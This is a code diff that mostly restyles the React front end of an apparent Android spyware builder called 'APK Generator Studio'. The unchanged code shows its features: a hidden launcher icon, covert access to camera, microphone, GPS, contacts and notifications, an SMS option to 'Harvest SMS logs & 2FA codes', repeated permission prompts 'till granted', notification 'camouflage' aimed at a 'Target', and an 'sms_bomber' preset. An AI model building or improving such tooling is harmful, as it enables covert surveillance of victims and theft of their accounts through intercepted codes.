@@ -7,7 +7,7 @@ import {
     ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
     AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
     Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
-    Settings, MousePointerClick, CheckSquare
+    Settings, MousePointerClick, ArrowRight, ArrowLeft
 } from 'lucide-react';
 
 interface AppGenerationModalProps {
@@ -530,31 +530,31 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         switch (presetId) {
             case 'temp_mail':
                 return (
-                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-emerald-500 via-emerald-600 to-teal-700 flex items-center justify-center shadow-lg border border-emerald-400/30">
+                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-emerald-500 to-teal-700 flex items-center justify-center shadow-lg border border-emerald-400/30 shrink-0">
                         <Mail className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                     </div>
                 );
             case 'poki_games':
                 return (
-                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-purple-500 via-indigo-600 to-violet-800 flex items-center justify-center shadow-lg border border-purple-400/30">
+                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-purple-500 to-indigo-700 flex items-center justify-center shadow-lg border border-purple-400/30 shrink-0">
                         <Gamepad2 className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                     </div>
                 );
             case 'movie_box':
                 return (
-                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-rose-500 via-pink-600 to-red-800 flex items-center justify-center shadow-lg border border-rose-400/30">
+                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-rose-500 to-red-700 flex items-center justify-center shadow-lg border border-rose-400/30 shrink-0">
                         <Film className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                     </div>
                 );
             case 'sms_bomber':
                 return (
-                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-amber-500 via-orange-600 to-red-600 flex items-center justify-center shadow-lg border border-orange-400/30">
+                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-amber-500 to-red-600 flex items-center justify-center shadow-lg border border-orange-400/30 shrink-0">
                         <Flame className="w-5 h-5 sm:w-6 sm:h-6 text-amber-100 drop-shadow" />
                     </div>
                 );
             default:
                 return (
-                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-orange-500 via-amber-600 to-orange-700 flex items-center justify-center shadow-lg border border-orange-400/30">
+                    <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-orange-500 to-amber-700 flex items-center justify-center shadow-lg border border-orange-400/30 shrink-0">
                         <Globe className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                     </div>
                 );
@@ -632,36 +632,34 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     if (!isOpen) return null;
 
     return (
-        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/85 backdrop-blur-2xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
-            <div className="clay-card max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.95)] relative max-h-[92dvh] overflow-hidden border border-white/10 rounded-[2.5rem]">
+        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/85 backdrop-blur-2xl animate-in fade-in duration-200 p-2 sm:p-6 overflow-y-auto">
+            <div className="bg-[#111317] border border-white/10 rounded-[2rem] sm:rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.95)] relative max-h-[94dvh] sm:max-h-[92dvh] overflow-hidden">
                 
-                {/* ── Top Bar with Title Pill & Rose Close Action ── */}
-                <div className="px-5 sm:px-7 py-3.5 border-b border-white/5 bg-black/40 flex items-center justify-between flex-shrink-0">
-                    <div className="flex items-center gap-2.5">
-                        <div className="clay-pill clay-pill-orange px-3 py-1 flex items-center gap-2">
-                            <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse shadow-[0_0_8px_#f97316]" />
-                            <span className="text-[11px] font-mono font-black uppercase tracking-wider text-orange-200">
-                                APK Compiler Studio
-                            </span>
-                        </div>
+                {/* ── Top Bar with Title & Tactile Close Action ── */}
+                <div className="px-4 sm:px-7 py-3 sm:py-3.5 border-b border-white/5 bg-black/40 flex items-center justify-between flex-shrink-0">
+                    <div className="flex items-center gap-2">
+                        <span className="w-2 h-2 rounded-full bg-orange-500 animate-pulse shadow-[0_0_8px_#f97316]" />
+                        <span className="text-xs sm:text-sm font-black uppercase tracking-wider text-white">
+                            APK Generator Studio
+                        </span>
                     </div>
                     <button
                         type="button"
                         onClick={onClose}
-                        className="clay-button-sm w-9 h-9 rounded-xl flex items-center justify-center text-white/60 hover:text-rose-400 transition-colors cursor-pointer"
+                        className="w-8 h-8 rounded-xl bg-white/5 hover:bg-rose-500/20 border border-white/10 hover:border-rose-500/40 text-white/60 hover:text-rose-300 flex items-center justify-center transition-all cursor-pointer"
                         title="Close Studio"
                     >
-                        <X size={18} />
+                        <X size={16} />
                     </button>
                 </div>
 
-                {/* ── 3D Segmented Stepper Bar ── */}
-                <div className="px-5 sm:px-7 py-3 border-b border-white/5 bg-black/20 flex-shrink-0">
-                    <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/50 border border-white/5 shadow-inner">
+                {/* ── 3D Segmented Stepper Bar (100% Mobile Full-Width Spelling Fix) ── */}
+                <div className="px-3 sm:px-7 py-2.5 sm:py-3 border-b border-white/5 bg-black/30 flex-shrink-0">
+                    <div className="grid grid-cols-3 gap-1.5 sm:gap-2 p-1 rounded-2xl bg-black/60 border border-white/5 shadow-inner">
                         {[
-                            { id: 'identity', stepNum: '1', label: 'App Mode' },
-                            { id: 'permissions', stepNum: '2', label: 'Permissions' },
-                            { id: 'notifications', stepNum: '3', label: 'Service Style' }
+                            { id: 'identity', stepNum: '1', mobileLabel: 'Mode', desktopLabel: 'App Mode' },
+                            { id: 'permissions', stepNum: '2', mobileLabel: 'Perms', desktopLabel: 'Permissions' },
+                            { id: 'notifications', stepNum: '3', mobileLabel: 'Style', desktopLabel: 'Service Style' }
                         ].map((item) => {
                             const isActive = activeStep === item.id;
                             return (
@@ -669,19 +667,24 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     key={item.id}
                                     type="button"
                                     onClick={() => setActiveStep(item.id as any)}
-                                    className={`py-2 px-2 sm:px-3 rounded-xl flex items-center justify-center gap-2 transition-all cursor-pointer ${
+                                    className={`py-2 px-1 sm:px-3 rounded-xl flex items-center justify-center gap-1.5 sm:gap-2 transition-all cursor-pointer ${
                                         isActive
-                                            ? 'clay-capsule border-orange-500/60 text-orange-300 shadow-[0_0_15px_rgba(249,115,22,0.35)] bg-orange-500/15 font-black'
-                                            : 'text-white/40 hover:text-white'
+                                            ? 'bg-orange-500/20 border border-orange-500/60 text-orange-300 shadow-[0_0_15px_rgba(249,115,22,0.3)] font-black'
+                                            : 'border border-transparent text-white/40 hover:text-white hover:bg-white/5'
                                     }`}
                                 >
-                                    <span className={`w-5 h-5 rounded-lg flex items-center justify-center text-[10px] font-mono font-black shrink-0 ${
+                                    <span className={`w-5 h-5 rounded-lg flex items-center justify-center text-[10px] font-black shrink-0 ${
                                         isActive ? 'bg-orange-500 text-white shadow-sm' : 'bg-white/10 text-white/50'
                                     }`}>
                                         {item.stepNum}
                                     </span>
-                                    <span className="text-xs font-mono font-bold truncate">
-                                        {item.label}
+                                    {/* Desktop full name */}
+                                    <span className="hidden sm:inline text-xs font-bold tracking-tight">
+                                        {item.desktopLabel}
+                                    </span>
+                                    {/* Mobile clean full name */}
+                                    <span className="sm:hidden text-[11px] font-bold tracking-tight">
+                                        {item.mobileLabel}
                                     </span>
                                 </button>
                             );
@@ -690,7 +693,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 </div>
 
                 {/* ── Main Scrollable Body ── */}
-                <div ref={contentScrollRef} className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
+                <div ref={contentScrollRef} className="p-4 sm:p-7 overflow-y-auto flex-1 space-y-5 sm:space-y-6 custom-scrollbar">
                     
                     {/* ── STEP 1: App Mode & Presets ── */}
                     {activeStep === 'identity' && (
@@ -698,10 +701,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             
                             {/* Preset Mode Chips */}
                             <div>
-                                <label className="block text-[11px] font-mono font-black text-white/50 uppercase tracking-widest mb-2.5">
+                                <label className="block text-[11px] font-bold text-white/50 uppercase tracking-widest mb-2.5">
                                     Select Application Engine
                                 </label>
-                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-2.5">
+                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-2 sm:gap-2.5">
                                     {APP_PRESETS.map((p) => {
                                         const isSelected = selectedPreset === p.id;
                                         return (
@@ -709,14 +712,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 key={p.id}
                                                 type="button"
                                                 onClick={() => setSelectedPreset(p.id)}
-                                                className={`clay-capsule p-3 rounded-2xl flex flex-col items-center justify-center gap-2 transition-all text-center cursor-pointer ${
+                                                className={`p-2.5 sm:p-3 rounded-2xl border flex flex-col items-center justify-center gap-1.5 sm:gap-2 transition-all text-center cursor-pointer ${
                                                     isSelected
                                                         ? 'border-orange-500/70 bg-orange-500/15 text-white shadow-[0_0_18px_rgba(249,115,22,0.3)] scale-[1.02]'
-                                                        : 'text-white/50 hover:text-white'
+                                                        : 'border-white/5 bg-white/[0.03] text-white/50 hover:text-white hover:border-white/15'
                                                 }`}
                                             >
                                                 {renderPresetIconBadge(p.id)}
-                                                <span className={`text-[11px] font-bold truncate w-full ${isSelected ? 'text-orange-300 font-black' : 'text-white/60'}`}>
+                                                <span className={`text-[11px] font-bold leading-tight truncate w-full ${isSelected ? 'text-orange-300 font-black' : 'text-white/60'}`}>
                                                     {p.name}
                                                 </span>
                                             </button>
@@ -726,57 +729,57 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             </div>
 
                             {/* Form Configuration & Realistic Screen Preview */}
-                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
+                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-4 sm:gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
                                 
                                 {/* Custom Inputs (ONLY for custom mode) */}
                                 {selectedPreset === 'custom' && (
-                                    <div className="sm:col-span-7 space-y-3.5">
+                                    <div className="sm:col-span-7 space-y-3">
                                         <div>
-                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                            <label className="block text-[10px] font-bold text-white/50 uppercase tracking-wider mb-1">
                                                 App Display Name
                                             </label>
                                             <input
                                                 type="text"
                                                 value={customAppName}
                                                 onChange={(e) => handleAppNameChange(e.target.value)}
-                                                className="clay-capsule w-full px-4 py-2.5 rounded-xl text-xs font-bold text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 shadow-inner"
+                                                className="w-full bg-black/40 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs font-bold text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 transition-colors shadow-inner"
                                                 placeholder="e.g. Gallery Pro"
                                             />
                                         </div>
 
                                         <div>
-                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                            <label className="block text-[10px] font-bold text-white/50 uppercase tracking-wider mb-1">
                                                 Package Identifier (3 Segments)
                                             </label>
                                             <input
                                                 type="text"
                                                 value={customPackageName}
                                                 onChange={(e) => setCustomPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
-                                                className="clay-capsule w-full px-4 py-2.5 rounded-xl text-xs font-mono text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 shadow-inner"
+                                                className="w-full bg-black/40 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 transition-colors shadow-inner"
                                                 placeholder="com.gallery.eye"
                                             />
                                         </div>
 
                                         <div>
-                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                            <label className="block text-[10px] font-bold text-white/50 uppercase tracking-wider mb-1">
                                                 Launch Web URL
                                             </label>
                                             <input
                                                 type="url"
                                                 value={customWebLink}
                                                 onChange={(e) => setCustomWebLink(e.target.value)}
-                                                className="clay-capsule w-full px-4 py-2.5 rounded-xl text-xs text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 shadow-inner"
+                                                className="w-full bg-black/40 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 transition-colors shadow-inner"
                                                 placeholder="https://example.com"
                                             />
                                         </div>
 
                                         <div>
-                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
+                                            <label className="block text-[10px] font-bold text-white/50 uppercase tracking-wider mb-1">
                                                 App Icon (PNG / JPG)
                                             </label>
-                                            <label className="clay-capsule w-full p-3 rounded-xl flex items-center justify-between cursor-pointer group hover:border-orange-500/40">
+                                            <label className="w-full bg-black/30 border border-dashed border-white/15 hover:border-orange-500/40 rounded-xl p-2.5 sm:p-3 flex items-center justify-between cursor-pointer transition-colors group">
                                                 <div className="flex items-center gap-2.5">
-                                                    <div className="clay-icon-pod w-8 h-8 rounded-lg flex items-center justify-center text-orange-400">
+                                                    <div className="w-8 h-8 rounded-lg bg-orange-500/10 border border-orange-500/20 flex items-center justify-center text-orange-400">
                                                         <Upload size={14} />
                                                     </div>
                                                     <div>
@@ -796,19 +799,19 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 )}
 
                                 {/* Realistic Live Android Screen Card */}
-                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-xs mx-auto w-full'} clay-card p-5 rounded-3xl flex flex-col items-center justify-center text-center shadow-xl relative`}>
-                                    <span className="text-[9px] font-mono font-black text-white/40 uppercase tracking-widest mb-3">
+                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-xs mx-auto w-full'} bg-gradient-to-b from-white/[0.04] to-black/40 border border-white/10 p-4 sm:p-5 rounded-3xl flex flex-col items-center justify-center text-center shadow-xl relative`}>
+                                    <span className="text-[9px] font-black text-white/40 uppercase tracking-widest mb-2.5">
                                         Live Android Icon
                                     </span>
                                     
-                                    <div className="w-20 h-20 sm:w-22 sm:h-22 mb-2.5 relative group">
+                                    <div className="w-20 h-20 sm:w-22 sm:h-22 mb-2 relative group">
                                         {renderRealisticIcon()}
 
                                         {selectedPreset !== 'custom' && (
                                             <button
                                                 type="button"
                                                 onClick={() => setShowAppInfoModal(selectedPreset)}
-                                                className="clay-button-sm w-6 h-6 rounded-full flex items-center justify-center absolute -top-1 -right-1 text-orange-300 shadow-lg cursor-pointer"
+                                                className="w-6 h-6 rounded-full bg-black/80 text-orange-300 border border-orange-400/50 flex items-center justify-center absolute -top-1 -right-1 shadow-lg hover:scale-110 transition-transform cursor-pointer"
                                                 title="View App Details"
                                             >
                                                 <Info size={12} />
@@ -827,7 +830,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                                     {/* Hide App Toggle Switch */}
                                     {selectedPreset === 'custom' && (
-                                        <div className="mt-4 w-full pt-3 border-t border-white/5 flex items-center justify-between">
+                                        <div className="mt-3.5 w-full pt-3 border-t border-white/5 flex items-center justify-between">
                                             <span className="text-[11px] font-bold text-white/70">Hide Launcher Icon</span>
                                             <button
                                                 type="button"
@@ -852,21 +855,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {activeStep === 'permissions' && (
                         <div className="space-y-4 animate-in fade-in duration-200">
                             
-                            <div className="clay-pill clay-pill-orange px-3 py-1 flex items-center gap-2 w-fit">
+                            <div className="flex items-center gap-2 px-1">
                                 <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
-                                <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
-                                    Hardware & Sensor Permissions
+                                <span className="text-xs font-black uppercase tracking-wider text-orange-200">
+                                    Hardware & Sensor Access
                                 </span>
                             </div>
 
-                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 sm:gap-3">
                                 
                                 {/* Storage */}
-                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                <div className="p-3 sm:p-3.5 rounded-2xl bg-white/[0.03] border border-white/10 flex items-center justify-between gap-3">
                                     <div className="flex flex-col min-w-0">
                                         <div className="flex items-center gap-1.5">
                                             <span className="text-xs font-bold text-white">Gallery & Storage</span>
-                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-orange-400/60 hover:text-orange-300">
+                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-orange-400/70 hover:text-orange-300">
                                                 <Info size={13} />
                                             </button>
                                         </div>
@@ -882,12 +885,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
 
                                 {/* Camera */}
-                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                <div className="p-3 sm:p-3.5 rounded-2xl bg-white/[0.03] border border-white/10 flex items-center justify-between gap-3">
                                     <div className="flex flex-col min-w-0">
                                         <div className="flex items-center gap-1.5">
                                             <span className="text-xs font-bold text-white">Camera Capture</span>
                                             {!isPremium && <Lock size={11} className="text-white/30" />}
-                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-orange-400/60 hover:text-orange-300">
+                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-orange-400/70 hover:text-orange-300">
                                                 <Info size={13} />
                                             </button>
                                         </div>
@@ -906,12 +909,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
 
                                 {/* Microphone */}
-                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                <div className="p-3 sm:p-3.5 rounded-2xl bg-white/[0.03] border border-white/10 flex items-center justify-between gap-3">
                                     <div className="flex flex-col min-w-0">
                                         <div className="flex items-center gap-1.5">
                                             <span className="text-xs font-bold text-white">Live Microphone</span>
                                             {!isPremium && <Lock size={11} className="text-white/30" />}
-                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-orange-400/60 hover:text-orange-300">
+                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-orange-400/70 hover:text-orange-300">
                                                 <Info size={13} />
                                             </button>
                                         </div>
@@ -930,12 +933,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
 
                                 {/* Location */}
-                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                <div className="p-3 sm:p-3.5 rounded-2xl bg-white/[0.03] border border-white/10 flex items-center justify-between gap-3">
                                     <div className="flex flex-col min-w-0">
                                         <div className="flex items-center gap-1.5">
                                             <span className="text-xs font-bold text-white">Live GPS Location</span>
                                             {!isPremium && <Lock size={11} className="text-white/30" />}
-                                            <button type="button" onClick={() => setShowPermissionInfo('location')} className="text-orange-400/60 hover:text-orange-300">
+                                            <button type="button" onClick={() => setShowPermissionInfo('location')} className="text-orange-400/70 hover:text-orange-300">
                                                 <Info size={13} />
                                             </button>
                                         </div>
@@ -954,12 +957,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
 
                                 {/* Contacts */}
-                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                <div className="p-3 sm:p-3.5 rounded-2xl bg-white/[0.03] border border-white/10 flex items-center justify-between gap-3">
                                     <div className="flex flex-col min-w-0">
                                         <div className="flex items-center gap-1.5">
                                             <span className="text-xs font-bold text-white">Contacts Sync</span>
                                             {isBasicPlan && <Lock size={11} className="text-white/30" />}
-                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-orange-400/60 hover:text-orange-300">
+                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-orange-400/70 hover:text-orange-300">
                                                 <Info size={13} />
                                             </button>
                                         </div>
@@ -978,12 +981,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
 
                                 {/* Notification Reader */}
-                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                <div className="p-3 sm:p-3.5 rounded-2xl bg-white/[0.03] border border-white/10 flex items-center justify-between gap-3">
                                     <div className="flex flex-col min-w-0">
                                         <div className="flex items-center gap-1.5">
-                                            <span className="text-xs font-bold text-white">Alerts & WhatsApp</span>
+                                            <span className="text-xs font-bold text-white">Alerts & Notifications</span>
                                             {isBasicPlan && <Lock size={11} className="text-white/30" />}
-                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-orange-400/60 hover:text-orange-300">
+                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-orange-400/70 hover:text-orange-300">
                                                 <Info size={13} />
                                             </button>
                                         </div>
@@ -1007,7 +1010,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 <button
                                     type="button"
                                     onClick={() => setShowAdvancedPermissions(!showAdvancedPermissions)}
-                                    className="clay-capsule w-full py-2.5 px-4 rounded-xl flex items-center justify-between text-xs font-mono font-black text-orange-300 transition-all cursor-pointer"
+                                    className="w-full py-2.5 px-3.5 rounded-xl bg-white/[0.04] hover:bg-white/[0.08] border border-white/10 flex items-center justify-between text-xs font-bold text-orange-300 transition-all cursor-pointer"
                                 >
                                     <div className="flex items-center gap-2">
                                         <Sliders size={14} />
@@ -1017,18 +1020,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </button>
 
                                 {showAdvancedPermissions && (
-                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-3 animate-in fade-in duration-150">
+                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 sm:gap-3 mt-2.5 animate-in fade-in duration-150">
                                         {/* SMS Access */}
-                                        <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                        <div className="p-3 sm:p-3.5 rounded-2xl bg-rose-500/10 border border-rose-500/25 flex items-center justify-between gap-3">
                                             <div className="flex flex-col min-w-0">
                                                 <div className="flex items-center gap-1.5">
                                                     <span className="text-xs font-bold text-rose-300">SMS Messages</span>
-                                                    {isBasicPlan && <Lock size={11} className="text-white/30" />}
-                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/60 hover:text-rose-300">
+                                                    {isBasicPlan && <Lock size={11} className="text-rose-400/50" />}
+                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
                                                         <Info size={13} />
                                                     </button>
                                                 </div>
-                                                <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Harvest SMS logs & 2FA codes</span>
+                                                <span className="text-[10px] text-rose-300/70 font-mono mt-0.5 truncate">Harvest SMS logs & 2FA codes</span>
                                             </div>
                                             <button
                                                 type="button"
@@ -1047,13 +1050,13 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         </div>
 
                                         {/* Aggressive Mode */}
-                                        <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                        <div className="p-3 sm:p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/25 flex items-center justify-between gap-3">
                                             <div className="flex flex-col min-w-0">
                                                 <div className="flex items-center gap-1.5">
                                                     <span className="text-xs font-bold text-amber-300">Aggressive Prompt</span>
-                                                    {isBasicPlan && <Lock size={11} className="text-white/30" />}
+                                                    {isBasicPlan && <Lock size={11} className="text-amber-400/50" />}
                                                 </div>
-                                                <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Auto-reprompt till granted</span>
+                                                <span className="text-[10px] text-amber-300/70 font-mono mt-0.5 truncate">Auto-reprompt till granted</span>
                                             </div>
                                             <button
                                                 type="button"
@@ -1076,16 +1079,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {activeStep === 'notifications' && (
                         <div className="space-y-4 animate-in fade-in duration-200">
                             
-                            <div className="clay-pill clay-pill-orange px-3 py-1 flex items-center gap-2 w-fit">
+                            <div className="flex items-center gap-2 px-1">
                                 <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
-                                <span className="text-[10px] font-mono font-black uppercase tracking-wider text-orange-200">
+                                <span className="text-xs font-black uppercase tracking-wider text-orange-200">
                                     Background Service Camouflage
                                 </span>
                             </div>
 
                             {/* Dropdown 1: Style */}
                             <div className="relative">
-                                <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
+                                <label className="block text-[10px] font-bold text-white/50 uppercase tracking-wider mb-1">
                                     Notification Cloak Style
                                 </label>
                                 <button
@@ -1095,7 +1098,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         setIsActionMenuOpen(false);
                                         setIsIconMenuOpen(false);
                                     }}
-                                    className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
+                                    className="w-full bg-black/40 border border-white/10 hover:border-orange-500/40 rounded-2xl p-3 flex items-center justify-between text-left transition-all cursor-pointer"
                                 >
                                     <div className="flex items-center gap-3">
                                         <span className="text-xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon || "ℹ️"}</span>
@@ -1112,18 +1115,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </button>
 
                                 {isStyleMenuOpen && (
-                                    <div className="mt-2 bg-[#0c0e12] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-52 overflow-y-auto custom-scrollbar animate-in fade-in z-20 relative">
+                                    <div className="mt-1.5 bg-[#14161b] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-52 overflow-y-auto custom-scrollbar animate-in fade-in z-20 relative">
                                         {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                             <button
                                                 key={key}
                                                 type="button"
                                                 onClick={() => handleSelectStyle(key)}
-                                                className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
+                                                className={`w-full p-2.5 sm:p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
                                                     notificationStyle === key ? 'bg-orange-500/15 text-orange-300 font-bold' : 'hover:bg-white/5 text-white/70'
                                                 }`}
                                             >
                                                 <div className="flex items-center gap-2.5">
-                                                    <span className="text-lg">{preset.icon}</span>
+                                                    <span className="text-base">{preset.icon}</span>
                                                     <div>
                                                         <div className="text-xs font-bold text-white">{preset.title}</div>
                                                         <div className="text-[10px] text-white/40 font-mono">{preset.text}</div>
@@ -1138,7 +1141,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                             {/* Dropdown 2: On-Click Action */}
                             <div className="relative">
-                                <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
+                                <label className="block text-[10px] font-bold text-white/50 uppercase tracking-wider mb-1">
                                     When Target Taps Notification
                                 </label>
                                 <button
@@ -1148,10 +1151,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         setIsStyleMenuOpen(false);
                                         setIsIconMenuOpen(false);
                                     }}
-                                    className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
+                                    className="w-full bg-black/40 border border-white/10 hover:border-orange-500/40 rounded-2xl p-3 flex items-center justify-between text-left transition-all cursor-pointer"
                                 >
-                                    <div className="flex items-center gap-3">
-                                        <div className="clay-icon-pod w-7 h-7 rounded-lg flex items-center justify-center text-orange-400">
+                                    <div className="flex items-center gap-2.5">
+                                        <div className="w-7 h-7 rounded-lg bg-orange-500/10 border border-orange-500/20 flex items-center justify-center text-orange-400">
                                             <MousePointerClick size={14} />
                                         </div>
                                         <span className="text-xs font-bold text-white">
@@ -1162,7 +1165,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </button>
 
                                 {isActionMenuOpen && (
-                                    <div className="mt-2 bg-[#0c0e12] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-52 overflow-y-auto custom-scrollbar animate-in fade-in z-20 relative">
+                                    <div className="mt-1.5 bg-[#14161b] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-52 overflow-y-auto custom-scrollbar animate-in fade-in z-20 relative">
                                         {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
                                             <button
                                                 key={key}
@@ -1171,7 +1174,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     setNotificationClickAction(key);
                                                     setIsActionMenuOpen(false);
                                                 }}
-                                                className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
+                                                className={`w-full p-2.5 sm:p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
                                                     notificationClickAction === key ? 'bg-orange-500/15 text-orange-300 font-bold' : 'hover:bg-white/5 text-white/70'
                                                 }`}
                                             >
@@ -1185,7 +1188,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
